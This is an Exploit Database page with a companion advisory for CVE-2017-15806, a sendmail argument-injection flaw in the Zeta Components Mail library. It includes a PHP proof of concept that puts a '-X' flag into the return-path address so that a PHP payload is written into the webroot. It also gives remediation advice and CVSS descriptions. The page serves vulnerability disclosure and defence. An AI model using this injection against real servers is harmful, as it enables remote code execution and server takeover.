**Vulnerable App:**

```
Vendor: Zeta Components

module: Mail, <= 1.8.1

Published: November 12nd, 2017

Reported by: Kay

CVE-2017-15806

Overview

Zeta Components are a high quality, general purpose library of loosly coupled components for development of applications based on PHP 5. An issue was discovered in the Mail package for Zeta Components. It’s possible to exploit this vulnerability to execute arbitrary shell commands on the remote server.

Detail

This vulnerability is on send method in ezcMailMtaTransport class.

In /src/transports/mta/mta_transport.php at line 73, send() method use PHP mail() method to deliver email, while PHP use sendmail as default MTA. When mail() method is called, the 5th parameter is $additionalParameters , this parameter can pass extra param to sendmail. As the code shown, it is assigned by this line:

$additionalParameters = "-f{$mail->returnPath->email}”;

If attacker assign email address like:

'kay_malwarebenchmark@outlook.com -X/var/www/html/cache/exploit.php'

and inject payload in mail body, sendmail will transfer log(-X) into /var/www/html/cache/exploit.php. The resulting file will contain the payload passed in the body of the email, that can then be accessed and run through domainname/cache/exploit.php.

To summary, it is possible if all of these conditions are true:

- you use the ezcMailMtaTransport
- your “sendmail” binary allows the -X flag to be set, which is not the case for exim4 and postfix, as they don’t support that argument
- your wwwroot is writable by the user your webserver is running at the input to use for the ezcMailAddress that is assigned to the returnPath property is not properly escaped

PoC

 use Mail\mail;

 $mail = new ezcMail();
 $mail->returnPath = new ezcMailAddress('kay_malwarebenchmark@outlook.com -X/var/www/html/cache/exploit.php');
 $mail->addTo( new ezcMailAddress('some one'));
 $mail->subject = "Mail PoC Exploit";
 $mail->body = new ezcMailText("<?php phpinfo(); ?>");
 $transport = new ezcMailMtaTransport();
 $transport->send($mail);

Remediation

Upgrade Mail to 1.8.2

```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## Package

composer

zetacomponents/mail
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

< 1.8.2

## Patched versions

1.8.2

## Description

The send function in the ezcMailMtaTransport class in Zeta Components Mail before 1.8.2 does not properly restrict the set of characters used in the ezcMail returnPath property, which might allow remote attackers to execute arbitrary code via a crafted email address, as demonstrated by one containing "-X/path/to/wwwroot/file.php."

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
